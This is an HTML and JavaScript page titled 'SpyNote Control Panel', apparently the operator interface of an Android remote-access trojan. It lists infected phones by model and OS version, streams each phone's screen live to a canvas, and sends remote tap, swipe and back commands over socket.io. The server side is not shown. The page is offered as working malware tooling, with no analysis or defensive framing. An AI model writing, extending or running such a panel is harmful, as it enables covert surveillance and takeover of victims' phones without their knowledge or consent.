<!DOCTYPE html>
<html>
<head>
    <title>SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg,#111,#222);
            color: #fff;
            height: 100vh;
            overflow: hidden;
        }

        #devices {
            position: fixed;
            top: 10px;
            left: 10px;
            width: 240px;
            background: rgba(0,0,0,0.85);
            padding: 12px;
            border-radius: 10px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .device {
            padding: 10px;
            margin: 6px 0;
            background: #333;
            border-radius: 6px;
            cursor: pointer;
        }

        .device:hover { background: #555; }
        .active { background: #00ff88 !important; color:#000; }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            width: 360px;
            height: 720px;
            margin: 20px auto;
            background: #000;
            border: 20px solid #333;
            border-radius: 40px;
            position: relative;
            touch-action: none;
        }

        canvas {
            width: 100%;
            height: 100%;
            background: #000;
            border-radius: 20px;
            image-rendering: pixelated;
        }

        #controls {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
        }

        button {
            padding: 12px 24px;
            margin: 0 8px;
            background: #007bff;
            border: none;
            border-radius: 20px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover { background: #0056b3; }

        #status {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            padding: 8px;
            border-radius: 6px;
            font-size: 14px;
        }
    </style>
</head>

<body>

<div id="devices">
    <h3>ðŸ“± Devices</h3>
    <div id="device-list">Loading...</div>
</div>

<div id="status">
    Status: <span id="conn">Connecting...</span><br>
    Selected: <span id="sel">-</span>
</div>

<div id="phone-frame">
    <canvas id="screen"></canvas>
</div>

<div id="controls">
    <button onclick="sendBack()">ðŸ”™ Back</button>
    <button onclick="toggleFullScreen()">ðŸ“± Fullscreen</button>
</div>

<script>
/* ================= SOCKET ================= */
const socket = io();

const canvas = document.getElementById('screen');
const ctx = canvas.getContext('2d');

const deviceList = document.getElementById('device-list');
const conn = document.getElementById('conn');
const sel = document.getElementById('sel');
const phoneFrame = document.getElementById('phone-frame');

let currentDevice = null;
let deviceWidth = 0;
let deviceHeight = 0;

/* ================= CONNECTION ================= */
socket.on('connect', () => {
    conn.textContent = 'Connected';
    conn.style.color = '#00ff88';
});

/* ================= DEVICES ================= */
fetch('/devices')
    .then(r => r.json())
    .then(updateDeviceList);

socket.on('devices-update', updateDeviceList);

function updateDeviceList(devices) {
    if (!devices.length) {
        deviceList.innerHTML = 'No devices';
        return;
    }

    deviceList.innerHTML = '';
    devices.forEach(([id, info]) => {
        const div = document.createElement('div');
        div.className = 'device ' + (!info.connected ? 'disconnected' : '');
        div.innerHTML = `
            <b>${info.model || id.slice(0,8)}</b><br>
            <small>${info.brand || ''} ${info.version || ''}</small>
            ${info.connected ? 'ðŸŸ¢' : 'ðŸ”´'}
        `;
        div.onclick = () => selectDevice(id, div);
        deviceList.appendChild(div);
    });
}

function selectDevice(id, el) {
    currentDevice = id;
    sel.textContent = id.slice(0,8);
    document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
    el.classList.add('active');
}

/* ================= SCREEN FRAME (FIXED) ================= */
socket.on('screen-frame', data => {
    if (data.deviceId !== currentDevice) return;

    console.log('ðŸ–¥ï¸ Frame:', data.width + 'x' + data.height);

    deviceWidth = data.width;
    deviceHeight = data.height;

    // âœ… IMPORTANT: real canvas resolution
    canvas.width = deviceWidth;
    canvas.height = deviceHeight;

    const img = new Image();
    img.onload = () => {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
    };
    img.src = 'data:image/jpeg;base64,' + data.data;
});

/* ================= TOUCH / MOUSE ================= */
let dragging = false;
let startX = 0, startY = 0;

function scaleCoords(clientX, clientY) {
    const r = phoneFrame.getBoundingClientRect();
    return {
        x: (clientX - r.left) * deviceWidth / r.width,
        y: (clientY - r.top) * deviceHeight / r.height
    };
}

phoneFrame.addEventListener('mousedown', e => {
    if (!currentDevice) return;
    dragging = true;
    const p = scaleCoords(e.clientX, e.clientY);
    startX = p.x;
    startY = p.y;
    sendTap(startX, startY);
});

phoneFrame.addEventListener('mousemove', e => {
    if (!dragging || !currentDevice) return;
    const p = scaleCoords(e.clientX, e.clientY);
    sendSwipe(startX, startY, p.x, p.y);
});

phoneFrame.addEventListener('mouseup', () => dragging = false);

/* ================= COMMANDS ================= */
function sendTap(x,y) {
    socket.emit('control', {
        deviceId: currentDevice,
        action: 'tap',
        x, y
    });
}

function sendSwipe(sx,sy,ex,ey) {
    socket.emit('control', {
        deviceId: currentDevice,
        action: 'swipe',
        startX: sx,
        startY: sy,
        endX: ex,
        endY: ey
    });
}

function sendBack() {
    socket.emit('control', {
        deviceId: currentDevice,
        action: 'back'
    });
}

function toggleFullScreen() {
    document.fullscreenElement
        ? document.exitFullscreen()
        : document.documentElement.requestFullscreen();
}
</script>

</body>
</html>
